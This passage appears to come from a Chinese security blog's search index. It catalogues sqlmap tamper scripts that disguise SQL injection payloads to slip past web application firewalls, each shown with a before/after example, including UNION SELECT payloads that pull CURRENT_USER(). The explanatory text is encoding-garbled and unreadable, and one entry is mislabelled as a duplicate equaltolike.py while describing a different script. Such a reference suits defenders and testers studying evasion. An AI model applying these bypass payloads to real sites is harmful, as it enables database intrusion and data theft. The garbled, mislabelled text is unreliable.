id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br> ä½œç”¨ï¼šéšæœºå¤§å°å†™<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šINseRt</p><ol start="16"><li><h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šASPã€ASP.NET<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000/2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3<br> ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç <br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD%20FROM TABLEâ€™)<br> ä½¿ç”¨è„šæœ¬</p><p>åï¼š%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><ol start="17"><li><h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º/<strong>/<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT/</strong>/id/<strong>/FROM/</strong>/users</p><ol start="18"><li><h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5<br> ä½œç”¨ï¼šå°†=æ›¿æ¢ä¸ºLIKE<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT * FROM users WHERE id=1â€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT * FROM users WHERE id LIKE 1</p><ol start="19"><li><h3 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br> ä½œç”¨ï¼šå°†&gt;æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹&gt;çš„è¿‡æ»¤<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND GREATEST(A,B+1)=A</p><ol start="20"><li><h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly)<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 and 5.5<br> ä½œç”¨ï¼šå°†ç±»ä¼¼äºIFNULL(A, B)æ›¿æ¢ä¸ºIF(ISNULL(A), B, A)ï¼Œç»•è¿‡å¯¹IFNULLçš„è¿‡æ»¤<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜IFNULL(1, 2)â€™)<br> ä½¿ç”¨è„šæœ¬åï¼šIF(ISNULL(1),2,1)</p><ol start="21"><li><h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br> ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 /<em>!30874AND 2&gt;1</em>/â€“</p><ol start="22"><li><h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Bid%0DFROM%0Cusers</p><ol start="23"><li><h3 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br> ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼ï¼ˆ/<em>!00000</em>/ï¼‰è¿›è¡Œæ³¨å…¥<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 /<em>!00000AND 2&gt;1</em>/â€“</p><ol start="24"><li><h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQL<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º â€“ ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1â€“%0AANDâ€“%0A9227=9227</p><ol start="25"><li><h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOS<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOS<br> ä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨LIKEæ›¿æ¢=<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM users where id = 1â€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT%09id FROM users where id LIKE 1</p><ol start="26"><li><h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11<br> ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION ALL SELECT NULL, NULL, </p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,</p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p><ol start="27"><li><h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18/5.0.22<br> ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Š<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œvalueâ€™ UNION ALL SELECT </p><p>CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS </p><p>CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND </p><p>â€˜QDWaâ€™=â€™QDWaâ€)<br> ä½¿ç”¨è„šæœ¬åï¼š</p><p>valueâ€™/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND â€˜QDWaâ€™=â€™QDWa</p><ol start="28"><li><h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;= 5.1.13<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º#ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š</p><p>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p><ol start="29"><li><h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™=â€™1â€)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND %00%271%00%27=%00%271</p><ol start="30"><li><h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç <br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1%00</p><ol start="31"><li><h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br> ä½¿ç”¨è„šæœ¬</p><p>åï¼š%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><ol start="32"><li><h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND 1=1â€)<br> ä½¿ç”¨è„šæœ¬åï¼š1%bf%27 AND 1=1â€“</p><ol start="33"><li><h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­—<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šI/<strong>/N/</strong>/SERT</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€æ¢¦</title>
      <link href="/2019/09/07/0xdadream/"/>
      <url>/2019/09/07/0xdadream/</url>
      
        <content type="html"><![CDATA[<h2 id="è¿™ä¸€é¡µç”¨æ¥ç•™è¨€ï¼Œäº¤æµ"><a href="#è¿™ä¸€é¡µç”¨æ¥ç•™è¨€ï¼Œäº¤æµ" class="headerlink" title="è¿™ä¸€é¡µç”¨æ¥ç•™è¨€ï¼Œäº¤æµ"></a>è¿™ä¸€é¡µç”¨æ¥ç•™è¨€ï¼Œäº¤æµ</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
